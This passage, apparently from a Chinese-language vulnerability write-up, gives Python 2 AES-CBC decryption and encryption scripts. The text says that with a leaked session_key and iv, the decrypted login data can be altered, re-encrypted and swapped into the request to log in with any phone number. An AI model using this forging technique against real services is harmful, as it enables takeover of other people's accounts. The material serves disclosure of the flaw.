## 加解密代码

在获取到session\_key，以及iv的情况下，直接可以进行解密：

```
1.  `#!python`
    
2.  `#!/usr/bin/env python`
    
3.  `# -*- coding:utf-8 -*-`
    
4.  
    
5.  `import base64`
    
6.  `from Crypto.Cipher import *`
    
7.  
    
8.  
    
9.  `def decrypt(enStr, key, iv):`
    
10.  `        cipher = AES.new(key, AES.MODE_CBC, iv)`
     
11.  `        msg = cipher.decrypt(enStr)`
     
12.  `        paddingLen = ord(msg[len(msg)-1])`
     
13.  `        return msg[0:-paddingLen]`
     
14.  
     
15.  
     
16.  `def decryptData(encryptedData, iv, sessionKey):`
     
17.  `    aesIV = base64.b64decode(iv)`
     
18.  `    aesCipher = base64.b64decode(encryptedData)`
     
19.  `    aesKey = base64.b64decode(sessionKey)`
     
20.  `    return decrypt(aesCipher, aesKey, aesIV)`
     
21.  
     
22.  
     
23.  `if __name__ == '__main__':`
     
24.  `    print decryptData(data, iv, sessionkey)`
     
```

然后可以对其进行修改后进行伪造，完成任意手机号码登陆。  
加密的代码：  

```
1.  `#!python`
    
2.  `#!/usr/bin/env python`
    
3.  `# -*- coding:utf-8 -*-`
    
4.  
    
5.  `import base64`
    
6.  `from Crypto.Cipher import AES`
    
7.  
    
8.  
    
9.  `def encrypt(str, key, iv):`
    
10.  `    cipher = AES.new(key, AES.MODE_CBC,iv)`
     
11.  `    x = 16 - (len(str) % 16)`
     
12.  `    if x != 0:`
     
13.  `        str = str + chr(x)*x`
     
14.  `    msg = base64.b64encode(cipher.encrypt(str))`
     
15.  `    return msg`
     
16.  
     
17.  `def encryptData(decryptedData, iv, sessionKey):`
     
18.  `    aesIV = base64.b64decode(iv)`
     
19.  `    aesKey = base64.b64decode(sessionKey) `
     
20.  `    return encrypt(decryptedData, aesKey, aesIV)`
     
21.  
     
22.  `if __name__ == '__main__':`
     
23.  `    print encryptData(data, iv, sessionKey)`
     
```

  
然后将得到的结果替换报文原来的加密内容。（这里是一次性有效的，无论成功与否）
